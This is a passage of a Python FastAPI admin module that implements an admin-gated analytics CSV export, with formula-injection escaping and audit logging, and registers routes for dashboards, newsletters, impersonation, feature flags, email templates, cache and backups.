        export_csv_href=csv_href,
        window_label=window_label,
        spark_total=f"{spark_total:,}",
        spark_start=spark_start,
        spark_end=spark_end,
        raw_stats_cards=_render_analytics_stats_cards(summary),
        raw_sparkline_svg=_render_analytics_sparkline_svg(spark_series),
        raw_pages_sort_headers=_render_analytics_pages_sort_headers(
            sort, sort_dir, base_qs,
        ),
        raw_pages_rows=_render_analytics_pages_rows(top_pages),
        raw_events_rows=_render_analytics_events_rows(top_events),
        raw_empty_state=raw_empty_state,
    )


async def analytics_export_csv(request: Request):
    """GET /admin/analytics/export.csv — raw analytics_events CSV download.

    Mirrors the page's date-range filter. Cap at 5000 rows so an admin
    who forgets to filter doesn't accidentally export 100MB. Uses
    ``_csv_safe_cell`` to defang spreadsheet formula injection in every
    cell (page, referrer, properties etc. all come from untrusted clients).
    """
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    qp = request.query_params
    since_ts, until_ts, _, _ = _resolve_analytics_window(qp)

    rows = db.list_analytics_events_for_export(since_ts, until_ts, limit=5000)

    import csv as _csv
    import io as _io
    buf = _io.StringIO()
    w = _csv.writer(buf)
    w.writerow([
        "id", "created_at_iso", "event_type", "user_id", "session_id",
        "visitor_id", "page", "referrer", "ip_hash", "user_agent_category",
        "properties",
    ])
    for r in rows:
        keys = r.keys()
        # visitor_id may be missing on pre-migration-200 dbs; tolerate.
        visitor_id = r["visitor_id"] if "visitor_id" in keys else ""
        ts_iso = ""
        try:
            ts_iso = _dt.datetime.utcfromtimestamp(int(r["created_at"])).strftime(
                "%Y-%m-%d %H:%M:%S"
            )
        except (TypeError, ValueError, OverflowError):
            pass
        w.writerow([
            _csv_safe_cell(r["id"]),
            _csv_safe_cell(ts_iso),
            _csv_safe_cell(r["event_type"] or ""),
            _csv_safe_cell(r["user_id"] if r["user_id"] is not None else ""),
            _csv_safe_cell(r["session_id"] or ""),
            _csv_safe_cell(visitor_id or ""),
            _csv_safe_cell(r["page"] or ""),
            _csv_safe_cell(r["referrer"] or ""),
            _csv_safe_cell(r["ip_hash"] or ""),
            _csv_safe_cell(r["user_agent_category"] or ""),
            _csv_safe_cell(r["properties"] or ""),
        ])

    try:
        from security import audit as _a
        _audit(
            getattr(
                _a.AuditAction,
                "ANALYTICS_EXPORT",
                "admin.analytics.export",
            ),
            admin=admin, request=request,
            target_type="analytics_export",
            target_description=f"csv · {len(rows)} rows",
            notes=f"since={since_ts} until={until_ts}",
        )
    except Exception:
        pass

    from fastapi.responses import Response as _Response
    return _Response(
        content=buf.getvalue(),
        media_type="text/csv; charset=utf-8",
        headers={
            "Content-Disposition": 'attachment; filename="analytics_events.csv"',
            "Cache-Control": "no-store",
        },
    )


# ── Registration ─────────────────────────────────────────────────────────


def register(app) -> None:
    """Wire all admin routes into the given FastAPI app.

    Called once during server.py import. Idempotent — FastAPI dedupes by
    (path, method) so re-registering just no-ops (with a logged warning).
    """
    # /admin/users — new design-system user-management page (extracted
    # from the /admin monolith). Per-row mutation routes (promote/demote/
    # suspend/email/role/grant) stay on the existing server.py handlers;
    # this surface adds the GET render plus the new revoke-sessions /
    # export shortcuts and the bulk-actions POST.
    app.add_api_route(
        "/admin/users", users_page,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )
    app.add_api_route(
        "/admin/users/{user_id}/revoke-sessions", users_revoke_sessions,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/users/{user_id}/export", users_export_data,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/users/bulk-actions", users_bulk_actions,
        methods=["POST"], include_in_schema=False,
    )

    # /admin/analytics — page-view + event dashboard backed by the
    # analytics_events table. Uniques key on the narve_visitor cookie
    # (migration 200) with an IP-hash fallback for pre-cookie rows.
    app.add_api_route(
        "/admin/analytics", analytics_dashboard,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )
    app.add_api_route(
        "/admin/analytics/export.csv", analytics_export_csv,
        methods=["GET"], include_in_schema=False,
    )

    # Unified email-address aggregator — single searchable surface across
    # every email-collection source on the platform (9 sources). See
    # email_addresses_page docstring for the full inventory. Data layer:
    # db.aggregate_email_addresses + count_email_addresses_by_source.
    app.add_api_route(
        "/admin/email-addresses", email_addresses_page,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )
    app.add_api_route(
        "/admin/email-addresses/export.csv", email_addresses_export_csv,
        methods=["GET"], include_in_schema=False,
    )
    # POST sibling for "Export selected" — used when the selection's
    # ``emails=`` querystring would exceed ~2000 chars. Same response
    # contract as the GET path, payload comes from the form body.
    app.add_api_route(
        "/admin/email-addresses/export.csv", email_addresses_export_csv_post,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/email-addresses/export.json", email_addresses_export_json,
        methods=["GET"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/email-addresses/bulk-delete", email_addresses_bulk_delete,
        methods=["POST"], include_in_schema=False,
    )

    # Newsletter blast composer — see newsletter_page docstring for the
    # surface. Data layer: queries/newsletter.py; DB:
    # newsletter_campaigns (migration 183) + newsletter_subscribers.
    app.add_api_route(
        "/admin/newsletter", newsletter_page,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )
    app.add_api_route(
        "/admin/newsletter/recipients", newsletter_recipient_count_json,
        methods=["GET"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/newsletter/preview", newsletter_preview,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/newsletter/send", newsletter_send,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/newsletter/import", newsletter_import_post,
        methods=["POST"], include_in_schema=False,
    )

    app.add_api_route(
        "/admin/churn", churn_dashboard,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )

    # Share-loop dashboard — totals, top items, sharers, referrers, country
    # distribution. Data layer: queries/sharing_metrics.py; DB:
    # share_metrics (migration 114) + shared_* tables (110-112).
    app.add_api_route(
        "/admin/sharing", sharing_dashboard,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )

    app.add_api_route(
        "/admin/users/{user_id}/impersonate", impersonate_start,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/impersonations/end", impersonate_end,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/impersonations", impersonations_list,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )
    app.add_api_route(
        "/admin/impersonations/{session_id}", impersonation_detail,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )

    app.add_api_route(
        "/admin/flags", flags_page,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )
    app.add_api_route(
        "/admin/flags", flag_create,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/flags/{key}", flag_edit_page,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )
    app.add_api_route(
        "/admin/flags/{key}", flag_save,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/flags/{key}/delete", flag_delete,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/api/flags/evaluate/{key}", flag_evaluate_api,
        methods=["GET"], include_in_schema=False,
    )

    # Email *templates* editor lives at /admin/email-templates. The
    # /admin/emails surface is now the outbound queue / delivery review
    # diagnostic page (see admin_emails_routes.py).
    app.add_api_route(
        "/admin/email-templates", emails_page,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )
    app.add_api_route(
        "/admin/email-templates/{key}", email_edit_page,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )
    app.add_api_route(
        "/admin/email-templates/{key}", email_save,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/email-templates/{key}/preview", email_preview,
        methods=["POST"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/email-templates/{key}/reset", email_reset,
        methods=["POST"], include_in_schema=False,
    )

    # Forensic reverse-lookup for per-recipient email watermarks.
    app.add_api_route(
        "/admin/trace-watermark", trace_watermark_route,
        methods=["GET"], include_in_schema=False,
    )

    # Cache observability + nuclear clear button.
    app.add_api_route(
        "/admin/cache", cache_page,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )
    app.add_api_route(
        "/admin/cache/stats", cache_stats_json,
        methods=["GET"], include_in_schema=False,
    )
    app.add_api_route(
        "/admin/cache/clear", cache_clear,
        methods=["POST"], include_in_schema=False,
    )

    # Sentry recent-errors widget on the admin System Health tab.
    # Cached server-side for 5 minutes; auth token never leaves the server.
    app.add_api_route(
        "/admin/api/sentry", sentry_summary_json,
        methods=["GET"], include_in_schema=False,
    )

    # Backup health + recovery drill history. Surfaces what's in
    # /var/backups/narve and the last N rows of drill_runs so ops
    # knows backups are live + verifies are passing.
    app.add_api_route(
        "/admin/backups", backups_page,
        methods=["GET"], response_class=HTMLResponse, include_in_schema=False,
    )
